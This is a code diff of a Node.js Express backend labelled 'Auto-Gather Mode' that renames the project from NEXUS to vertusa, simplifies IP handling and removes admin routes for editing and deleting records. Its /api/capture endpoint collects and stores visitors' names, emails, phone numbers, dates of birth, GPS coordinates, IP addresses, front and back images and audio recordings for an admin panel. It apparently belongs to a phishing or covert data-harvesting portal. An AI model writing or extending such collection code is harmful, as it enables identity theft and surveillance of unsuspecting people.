@@ -1,5 +1,5 @@
 // ─────────────────────────────────────────────────────────────
-//  NEXUS // Backend — Auto-Gather Mode
+//  vertusa // Backend — Auto-Gather Mode
 // ─────────────────────────────────────────────────────────────
 const express = require("express");
 const path = require("path");
@@ -155,18 +155,13 @@ app.post("/api/capture", async (req, res) => {
       screen_res, language, platform, user_agent,
       form_name, form_email, form_phone, form_dob,
       geo_lat, geo_lon, geo_accuracy,
-      client_ip,
       front_image, back_image, audio_recording,
     } = req.body;
 
-    const raw_ip = client_ip || getClientIP(req);
+    const raw_ip = getClientIP(req);
     const geo = await fetchGeoLocation(raw_ip);
-    
-    let base_ip = geo.resolvedIP || raw_ip;
-    const device_ip = req.body.device_ip;
-    
-    // Combine public and local IPs for maximum accuracy
-    const ip_address = device_ip ? `${base_ip} | Local: ${device_ip}` : base_ip;
+    // Use the resolved public IP (if localhost was resolved via ipify)
+    const ip_address = geo.resolvedIP || raw_ip;
 
     const openDate = timestamp_open ? new Date(timestamp_open) : new Date();
     const openIST = openDate.toLocaleString("en-IN", { timeZone: "Asia/Kolkata" }) + " (IST)";
@@ -283,40 +278,9 @@ app.post("/api/admin/clear", (req, res) => {
   if (!checkAdmin(req, res)) return;
   try {
     db.run("DELETE FROM captures");
-    saveDB();
     return res.json({ success: true, message: "Logs cleared." });
   } catch (err) {
     console.error("Admin clear error:", err);
-    return res.status(500).json({ success: false, message: "DB Error" });
-  }
-});
-
-// ── DELETE /api/admin/record/:id — delete a specific record ──
-app.delete("/api/admin/record/:id", (req, res) => {
-  if (!checkAdmin(req, res)) return;
-  try {
-    db.run("DELETE FROM captures WHERE id = ?", [parseInt(req.params.id)]);
-    saveDB();
-    return res.json({ success: true, message: "Record deleted." });
-  } catch (err) {
-    console.error("Delete record error:", err);
-    return res.status(500).json({ success: false, message: "DB Error" });
-  }
-});
-
-// ── PUT /api/admin/record/:id — edit a specific record ──
-app.put("/api/admin/record/:id", (req, res) => {
-  if (!checkAdmin(req, res)) return;
-  try {
-    const { form_name, form_email, form_phone, form_dob } = req.body;
-    db.run(
-      `UPDATE captures SET form_name = ?, form_email = ?, form_phone = ?, form_dob = ? WHERE id = ?`,
-      [form_name, form_email, form_phone, form_dob, parseInt(req.params.id)]
-    );
-    saveDB();
-    return res.json({ success: true, message: "Record updated." });
-  } catch (err) {
-    console.error("Update record error:", err);
     return res.status(500).json({ success: false, message: "DB Error" });
   }
 });
@@ -340,7 +304,7 @@ initDB().then(() => {
   app.listen(PORT, () => {
     console.log(`
   ┌──────────────────────────────────────────────┐
-  │   NEXUS PORTAL running on port ${PORT}           │
+  │   vertusa PORTAL running on port ${PORT}           │
   │   http://localhost:${PORT}                       │
   │                                              │
   │   For HTTPS / mobile camera:                 │
